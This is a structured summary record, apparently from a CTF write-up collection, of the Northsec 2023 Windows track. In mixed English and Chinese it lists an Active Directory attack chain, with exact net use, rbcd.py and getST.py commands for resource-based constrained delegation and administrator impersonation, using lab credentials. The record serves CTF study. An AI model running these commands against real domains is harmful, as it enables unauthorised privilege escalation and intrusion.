---
title: Windows Track Northsec 2023 Writeup
contest: Northsec 2023 (Windows Track)
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [kerberos_delegation, rbcd_py, getst_py, resource_based_constrained_delegation, atm_net_use, swiftmq_amqp_ssl, amqp_5671, ipv6_scan, nfs_mount_packages, swiftmq_rabbitmq]
attack_chain: IPv6 扫描发现 www.bank.ctf + atm01.bank.ctf → net use z: \\NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService (暴露 NFS 凭据) → copy z:\software C:\Packages → rot47 解密 u{pv\a_732_d57g36275ffh_3cbgde5fg`6hc → rbcd.py -action write -delegate-from 'webdev-old$' -delegate-to 'ATM01$' 'bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337' → getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator → swiftmq 5671 SSL AMQP + pika SSLOptions 链
key_payload: net use z: \\NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService / rbcd.py -action write -delegate-from 'webdev-old$' -delegate-to 'ATM01$' 'bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337' / getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator -dc-ip ... -dc-ip
one_liner: Northsec 2023 Windows 域攻击链：IPv6 主机发现 + RunUpdate.bat net use 暴露 NFS 凭据 + rot47 解密 + rbcd RBCD 委派 + getST 伪造 cifs S4U2Self+Self 票据 + swiftmq AMQP SSL 通信。
lesson: RunUpdate.bat 类批处理日志直接暴露 net use 凭据是 Windows 域内网经典；rbcd.py + getST.py 是 impacket 域内 RBCD 委派攻击标配。
quality: high
---
